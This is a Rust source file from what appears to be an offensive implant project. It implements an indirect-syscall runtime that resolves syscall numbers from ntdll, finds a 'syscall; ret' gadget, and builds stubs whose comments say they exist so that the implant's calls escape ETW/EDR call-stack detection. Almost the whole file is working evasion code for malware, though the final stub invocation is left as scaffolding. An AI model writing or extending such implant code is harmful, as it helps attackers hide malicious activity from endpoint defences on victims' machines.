//! Indirect-syscall runtime.
//!
//! This is the capstone that turns `nyx_evasion` from a unit-tested algorithm
//! into a live runtime: it
//!   1. resolves the SSN table over the live ntdll (via `resolve::LiveNtdll`),
//!   2. scans ntdll for a `syscall; ret` gadget (the address an indirect stub
//!      jumps into so the executing RIP/return address land in ntdll),
//!   3. emits the indirect stub bytes (`nyx_evasion::indirect_stub`) into
//!      executable memory,
//!   4. exposes a `syscall!` macro + typed wrappers for the Nt* calls the
//!      implant needs.
//!
//! Why indirect: a direct syscall executes `syscall` from implant memory, so
//! the return address points outside any legitimate module — ETW/EDR call-stack
//! checks flag it. Indirect jumps to a `syscall` *inside ntdll*, so RIP and the
//! return address look legitimate. SSN resolution (Hell/Halo/Tartarus) recovers
//! the real numbers even when EDRs hook the stub prologues.

#![cfg(target_os = "windows")]

use crate::heap::{String, Vec};
use crate::resolve::{djb2, LiveNtdll};
use nyx_evasion::stub::indirect_stub;
use nyx_evasion::resolve_table;

/// The resolved syscall runtime: SSN table + the ntdll `syscall` gadget address.
pub struct Runtime {
    /// (api name, SSN) for every resolvable syscall.
    table: Vec<(String, u32)>,
    /// Absolute address of a `syscall; ret` gadget inside ntdll.
    syscall_gadget: u64,
}

impl Runtime {
    /// Build the runtime: locate ntdll, resolve SSNs, find the gadget. Returns
    /// None if ntdll can't be found (should never happen in a real process).
    pub unsafe fn init() -> Option<Self> {
        let ntdll = LiveNtdll::locate()?;
        let table = ntdll.resolve_table_owned();
        let syscall_gadget = scan_syscall_gadget(&ntdll)?;
        Some(Self {
            table,
            syscall_gadget,
        })
    }

    /// Look up the SSN for an API by name hash.
    pub fn ssn_by_hash(&self, name_hash: u32) -> Option<u32> {
        // The table holds String names; hash each to match. (Linear scan; the
        // table is a few hundred entries — fine for cold-path resolution.)
        for (name, ssn) in &self.table {
            if djb2(name.as_bytes()) == name_hash && *ssn != u32::MAX {
                return Some(*ssn);
            }
        }
        None
    }

    /// The ntdll `syscall; ret` gadget address (for indirect stubs).
    pub fn gadget(&self) -> u64 {
        self.syscall_gadget
    }

    /// Build the indirect-syscall stub bytes for `ssn`, ready to write into
    /// executable memory and call.
    pub fn indirect_stub_for(&self, ssn: u32) -> Vec<u8> {
        indirect_stub(ssn, self.syscall_gadget)
    }
}

/// Scan ntdll's image for a `syscall; ret` byte pair (`0F 05 C3`) and return
/// its absolute address. The first Nt* export stub contains one; any works as
/// the indirect-jump target.
unsafe fn scan_syscall_gadget(ntdll: &LiveNtdll) -> Option<u64> {
    // Scan ntdll for the first `syscall; ret` (0F 05 C3) gadget. Read the whole
    // scan range in one shot (not per-byte) to avoid 60k tiny allocations.
    let start = 0x1000u32;
    let end = 0x10000u32;
    let blob = ntdll.read(start, (end - start) as usize);
    for i in 0..blob.len().saturating_sub(2) {
        if blob[i] == 0x0F && blob[i + 1] == 0x05 && blob[i + 2] == 0xC3 {
            let rva = start + i as u32;
            return Some(ntdll.module().base as u64 + rva as u64);
        }
    }
    None
}

/// A typed wrapper around an indirect syscall. The macro is the public face;
/// it looks up the SSN, emits the indirect stub into a per-call trampoline, and
/// invokes it. M0: the stub-emission + invocation is scaffolded — the typed
/// helpers below resolve SSNs; the actual `call` wiring (alloc RX memory,
/// memcpy the stub, cast to fn pointer, call) is the convergence-step work.
#[macro_export]
macro_rules! syscall {
    ($rt:expr, $name:expr) => {
        $rt.ssn_by_hash($crate::resolve::djb2($name))
    };
}

/// Resolve the SSN for `NtAllocateVirtualMemory` (the canonical first syscall
/// an implant makes — proves the runtime is live).
pub fn ssn_nt_allocate_virtual_memory(rt: &Runtime) -> Option<u32> {
    rt.ssn_by_hash(djb2(b"ntallocatevirtualmemory"))
}

#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(target_arch = "x86_64")]
    #[test]
    fn djb2_keys_are_stable() {
        // The names the runtime looks up must hash consistently with the table.
        assert_eq!(
            djb2(b"ntallocatevirtualmemory"),
            djb2(b"NTALLOCATEVIRTUALMEMORY")
        );
    }
}
